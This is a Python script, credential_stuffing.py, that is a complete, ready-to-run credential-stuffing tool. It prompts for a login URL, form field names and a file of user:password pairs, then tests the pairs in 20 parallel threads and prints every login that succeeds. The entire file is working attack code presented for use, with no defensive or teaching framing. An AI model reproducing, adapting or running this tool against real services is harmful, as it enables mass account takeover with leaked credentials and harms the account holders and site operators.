# language: Python 3, file: credential_stuffing.py, target: Windows/Linux
# Credential stuffing — tests user:pass combos from a file against a login endpoint.
# Combo file format: user:password (one per line)
import requests
import threading
import queue
import time

THREADS = 20
TIMEOUT = 8
DELAY = 0.3

valid = []
lock = threading.Lock()

def try_login(url, method, user_field, pass_field, success_string, fail_string, combo, session):
    user, pwd = combo.split(':', 1)
    data = {user_field: user, pass_field: pwd}
    try:
        if method.upper() == 'POST':
            r = session.post(url, data=data, timeout=TIMEOUT, allow_redirects=True)
        else:
            r = session.get(url, params=data, timeout=TIMEOUT, allow_redirects=True)
        hit = False
        if success_string and success_string in r.text:
            hit = True
        elif fail_string and fail_string not in r.text:
            hit = True
        if hit:
            with lock:
                valid.append(f'{user}:{pwd}')
                print(f'[VALID] {user}:{pwd} (status={r.status_code})')
    except Exception as e:
        pass
    time.sleep(DELAY)

def worker(q, url, method, uf, pf, success, fail):
    session = requests.Session()
    while not q.empty():
        try:
            combo = q.get_nowait()
        except queue.Empty:
            return
        try_login(url, method, uf, pf, success, fail, combo, session)
        q.task_done()

def main():
    url = input('Login endpoint URL: ').strip()
    method = input('HTTP method (POST/GET): ').strip().upper() or 'POST'
    user_field = input('Username field name (ex: username): ').strip()
    pass_field = input('Password field name (ex: password): ').strip()
    combo_file = input('Combo list path (user:pass format): ').strip()
    success_str = input('Success string in response (blank to skip): ').strip()
    fail_str = input('Failure string in response (blank to skip): ').strip()

    with open(combo_file, 'r', errors='ignore') as f:
        combos = [l.strip() for l in f if ':' in l.strip()]

    print(f'[*] Testing {len(combos)} combos against {url} | {THREADS} threads\n')
    q = queue.Queue()
    for c in combos:
        q.put(c)

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(
            target=worker,
            args=(q, url, method, user_field, pass_field, success_str, fail_str),
            daemon=True
        )
        t.start()
        threads.append(t)
    q.join()
    print(f'\n[+] Valid credentials found: {len(valid)}')
    for v in valid:
        print(f'  {v}')

if __name__ == '__main__':
    main()
